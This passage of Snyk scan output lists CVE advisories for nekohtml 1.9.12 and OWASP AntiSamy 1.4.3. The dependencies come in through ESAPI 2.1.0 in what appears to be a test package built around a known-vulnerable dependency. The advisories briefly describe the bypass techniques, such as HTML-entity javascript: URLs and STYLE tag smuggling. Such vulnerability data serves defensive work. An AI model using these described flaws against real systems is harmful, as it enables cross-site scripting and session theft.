        "net.sourceforge.nekohtml:nekohtml@1.9.12"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.3.0.0",
        "org.owasp.antisamy:antisamy@1.6.7"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "net.sourceforge.nekohtml:nekohtml",
      "version": "1.9.12"
    },
    {
      "id": "SNYK-JAVA-NETSOURCEFORGENEKOHTML-2774754",
      "title": "Memory Allocation with Excessive Size Value",
      "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "net.sourceforge.nekohtml:nekohtml",
      "references": [
        {
          "url": "https://htmlunit.sourceforge.io/changes-report.html%23a2.27",
          "title": "Releases"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-10-29T01:10:33.676290Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Memory Allocation with Excessive Size Value via a crafted Processing Instruction (PI) input.\n## Remediation\nThere is no fixed version for `net.sourceforge.nekohtml:nekohtml`.\n## References\n- [Releases](https://htmlunit.sourceforge.io/changes-report.html#a2.27)\n",
      "epssDetails": {
        "percentile": "0.36345",
        "probability": "0.00088",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-28366"
        ],
        "CWE": [
          "CWE-789"
        ]
      },
      "packageName": "net.sourceforge.nekohtml:nekohtml",
      "proprietary": false,
      "creationTime": "2022-04-24T14:07:34.794547Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-04-24T13:26:47Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "net.sourceforge.nekohtml",
        "artifactId": "nekohtml"
      },
      "publicationTime": "2022-04-24T15:16:32Z",
      "modificationTime": "2022-10-29T01:10:33.676290Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "org.owasp.antisamy:antisamy@1.4.3",
        "net.sourceforge.nekohtml:nekohtml@1.9.12"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.3.0.0",
        "org.owasp.antisamy:antisamy@1.6.7"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "net.sourceforge.nekohtml:nekohtml",
      "version": "1.9.12"
    },
    {
      "id": "SNYK-JAVA-NETSOURCEFORGENEKOHTML-2803036",
      "title": "Heap-based Buffer Overflow",
      "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "net.sourceforge.nekohtml:nekohtml",
      "references": [
        {
          "url": "https://github.com/HtmlUnit/htmlunit-neko/commit/9d2aecd69223469e40c12ca3edddda09009110cc",
          "title": "GitHub Commit"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-05-05T01:10:56.807574Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Heap-based Buffer Overflow via a crafted Processing Instruction (PI) input.\n## Remediation\nThere is no fixed version for `net.sourceforge.nekohtml:nekohtml`.\n## References\n- [GitHub Commit](https://github.com/HtmlUnit/htmlunit-neko/commit/9d2aecd69223469e40c12ca3edddda09009110cc)\n",
      "epssDetails": {
        "percentile": "0.30603",
        "probability": "0.00075",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-29546"
        ],
        "CWE": [
          "CWE-122"
        ],
        "GHSA": [
          "GHSA-6jmm-mp6w-4rrg"
        ]
      },
      "packageName": "net.sourceforge.nekohtml:nekohtml",
      "proprietary": false,
      "creationTime": "2022-04-25T11:36:53.287581Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-04-25T11:31:46Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "net.sourceforge.nekohtml",
        "artifactId": "nekohtml"
      },
      "publicationTime": "2022-04-25T15:16:24.219695Z",
      "modificationTime": "2022-05-05T01:10:56.807574Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "org.owasp.antisamy:antisamy@1.4.3",
        "net.sourceforge.nekohtml:nekohtml@1.9.12"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.3.0.0",
        "org.owasp.antisamy:antisamy@1.6.7"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "net.sourceforge.nekohtml:nekohtml",
      "version": "1.9.12"
    },
    {
      "id": "SNYK-JAVA-ORGOWASPANTISAMY-1320080",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Sebastián Passaro"
      ],
      "semver": {
        "vulnerable": [
          "[,1.6.4)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "1.6.4"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "org.owasp.antisamy:antisamy",
      "references": [
        {
          "url": "https://github.com/nahsra/antisamy/commit/6a1c2f8a9e46872565229a9fe5f84b3b3bffbc6c",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/nahsra/antisamy/pull/87",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2022-10-29T13:10:59.763439Z"
        }
      ],
      "description": "## Overview\n[org.owasp.antisamy:antisamy](https://mvnrepository.com/artifact/org.owasp.antisamy/antisamy) is a library for performing fast, configurable cleansing of HTML coming from untrusted sources.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via HTML attributes when using the HTML output serializer (XHTML is not affected).\r\nWhen serializing results to HTML, URLs are not being encoded when they are on HTML attributes. This can lead to mistakes when validating values.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.owasp.antisamy:antisamy` to version 1.6.4 or higher.\n## References\n- [GitHub Commit](https://github.com/nahsra/antisamy/commit/6a1c2f8a9e46872565229a9fe5f84b3b3bffbc6c)\n- [GitHub PR](https://github.com/nahsra/antisamy/pull/87)\n",
      "epssDetails": {
        "percentile": "0.40289",
        "probability": "0.00100",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2021-35043"
        ],
        "CWE": [
          "CWE-79"
        ]
      },
      "packageName": "org.owasp.antisamy:antisamy",
      "proprietary": false,
      "creationTime": "2021-07-20T09:19:16.842327Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2021-07-20T08:45:35Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "org.owasp.antisamy",
        "artifactId": "antisamy"
      },
      "publicationTime": "2021-07-20T14:23:10.776196Z",
      "modificationTime": "2022-10-29T13:10:59.763439Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "org.owasp.antisamy:antisamy@1.4.3"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.3.0.0",
        "org.owasp.antisamy:antisamy@1.6.7"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.owasp.antisamy:antisamy",
      "version": "1.4.3"
    },
    {
      "id": "SNYK-JAVA-ORGOWASPANTISAMY-2774681",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Hyeong Gwan",
        "Yi"
      ],
      "semver": {
        "vulnerable": [
          "[,1.6.6)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "1.6.6"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "org.owasp.antisamy:antisamy",
      "references": [
        {
          "url": "https://github.com/nahsra/antisamy/commit/0199e7e194dba5e7d7197703f43ebe22401e61ae",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/nahsra/antisamy/releases/tag/v1.6.6",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2022-05-04T01:11:15.502903Z"
        }
      ],
      "description": "## Overview\n[org.owasp.antisamy:antisamy](https://mvnrepository.com/artifact/org.owasp.antisamy/antisamy) is a library for performing fast, configurable cleansing of HTML coming from untrusted sources.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `HTML` tag smuggling on `STYLE` content with crafted input. This is due to an improper serialization of the output which does not properly encode the supposed Cascading Style Sheets (CSS) content.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.owasp.antisamy:antisamy` to version 1.6.6 or higher.\n## References\n- [GitHub Commit](https://github.com/nahsra/antisamy/commit/0199e7e194dba5e7d7197703f43ebe22401e61ae)\n- [GitHub Release](https://github.com/nahsra/antisamy/releases/tag/v1.6.6)\n",
      "epssDetails": {
        "percentile": "0.19458",
        "probability": "0.00054",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-28367"
        ],
        "CWE": [
          "CWE-79"
        ]
      },
      "packageName": "org.owasp.antisamy:antisamy",
      "proprietary": false,
      "creationTime": "2022-04-24T10:59:44.569034Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-04-24T10:56:44Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "org.owasp.antisamy",
        "artifactId": "antisamy"
      },
      "publicationTime": "2022-04-24T14:02:56.777351Z",
      "modificationTime": "2022-05-04T01:11:15.502903Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "org.owasp.antisamy:antisamy@1.4.3"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.3.0.0",
        "org.owasp.antisamy:antisamy@1.6.7"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.owasp.antisamy:antisamy",
      "version": "1.4.3"
    },
    {
      "id": "SNYK-JAVA-ORGOWASPANTISAMY-2774682",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[,1.6.7)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "1.6.7"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "org.owasp.antisamy:antisamy",
      "references": [
        {
          "url": "https://github.com/nahsra/antisamy/commit/32e273507da0e964b58c50fd8a4c94c9d9363af0",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/nahsra/antisamy/releases/tag/v1.6.7",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2022-07-26T01:11:23.331406Z"
        }
      ],
      "description": "## Overview\n[org.owasp.antisamy:antisamy](https://mvnrepository.com/artifact/org.owasp.antisamy/antisamy) is a library for performing fast, configurable cleansing of HTML coming from untrusted sources.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `HTML` tag smuggling on `STYLE` content with a crafted input. This is due to an incomplete fix for [CVE-2022-28367](https://security.snyk.io/vuln/SNYK-JAVA-ORGOWASPANTISAMY-2774681)\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.owasp.antisamy:antisamy` to version 1.6.7 or higher.\n## References\n- [GitHub Commit](https://github.com/nahsra/antisamy/commit/32e273507da0e964b58c50fd8a4c94c9d9363af0)\n- [GitHub Release](https://github.com/nahsra/antisamy/releases/tag/v1.6.7)\n",
      "epssDetails": {
        "percentile": "0.45846",
        "probability": "0.00125",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-29577"
        ],
        "CWE": [
          "CWE-79"
        ]
      },
      "packageName": "org.owasp.antisamy:antisamy",
      "proprietary": false,
      "creationTime": "2022-04-24T11:02:30.412430Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-04-24T09:36:19Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "org.owasp.antisamy",
        "artifactId": "antisamy"
      },
      "publicationTime": "2022-04-24T14:36:23.431638Z",
      "modificationTime": "2022-07-26T01:11:23.331406Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "org.owasp.antisamy:antisamy@1.4.3"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.3.0.0",
        "org.owasp.antisamy:antisamy@1.6.7"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.owasp.antisamy:antisamy",
      "version": "1.4.3"
    },
    {
      "id": "SNYK-JAVA-ORGOWASPANTISAMY-31591",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
      "credit": [
        "Rajesh Veerappan"
      ],
      "semver": {
        "vulnerable": [
          "[,1.5.7)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "1.5.7"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 6.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "org.owasp.antisamy:antisamy",
      "references": [
        {
          "url": "https://github.com/nahsra/antisamy/commit/82da009e733a989a57190cd6aa1b6824724f6d36",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/nahsra/antisamy/issues/10",
          "title": "GitHub Issue"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2022-01-03T16:19:28.715391Z"
        }
      ],
      "description": "## Overview\n\n[org.owasp.antisamy:antisamy](https://mvnrepository.com/artifact/org.owasp.antisamy/antisamy) is a library for performing fast, configurable cleansing of HTML coming from untrusted sources.\n\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS)\nvia HTML5 entities, as demonstrated by use of `&colon;` to construct a javascript: URL.\n\n## Details\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\r\n\r\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\r\n\r\nֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\r\n\r\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\r\n \r\nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \r\n\r\n### Types of attacks\r\nThere are a few methods by which XSS can be manipulated:\r\n\r\n|Type|Origin|Description|\r\n|--|--|--|\r\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\r\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \r\n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\r\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\r\n\r\n### Affected environments\r\nThe following environments are susceptible to an XSS attack:\r\n\r\n* Web servers\r\n* Application servers\r\n* Web application environments\r\n\r\n### How to prevent\r\nThis section describes the top best practices designed to specifically protect your code: \r\n\r\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \r\n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \r\n* Give users the option to disable client-side scripts.\r\n* Redirect invalid requests.\r\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\r\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\r\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\n\nUpgrade `org.owasp.antisamy:antisamy` to version 1.5.7 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/nahsra/antisamy/commit/82da009e733a989a57190cd6aa1b6824724f6d36)\n\n- [GitHub Issue](https://github.com/nahsra/antisamy/issues/10)\n",
      "epssDetails": {
        "percentile": "0.65332",
        "probability": "0.00303",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2017-14735"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-q44v-xc3g-v7jq"
        ]
      },
      "packageName": "org.owasp.antisamy:antisamy",
      "proprietary": false,
      "creationTime": "2017-11-21T08:28:01.581000Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2017-07-05T21:00:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "org.owasp.antisamy",
        "artifactId": "antisamy"
      },
      "publicationTime": "2017-11-28T14:47:21Z",
      "modificationTime": "2022-01-03T16:19:28.715391Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "org.owasp.antisamy:antisamy@1.4.3"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.2.0.0",
        "org.owasp.antisamy:antisamy@1.5.8"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.owasp.antisamy:antisamy",
      "version": "1.4.3"
    },
    {
      "id": "SNYK-JAVA-ORGOWASPANTISAMY-598767",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
      "credit": [
        "Vivek Krishna"
      ],
      "semver": {
        "vulnerable": [
          "[,1.5.5)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "1.5.5"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 6.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "org.owasp.antisamy:antisamy",
      "references": [
        {
          "url": "https://github.com/nahsra/antisamy/commit/7313931dc3c0d1377b010f07faef2063dd359a36%23commitcomment-41485849",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/nahsra/antisamy/issues/2",
          "title": "GitHub Issue"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2022-01-03T17:41:49.097888Z"
        }
      ],
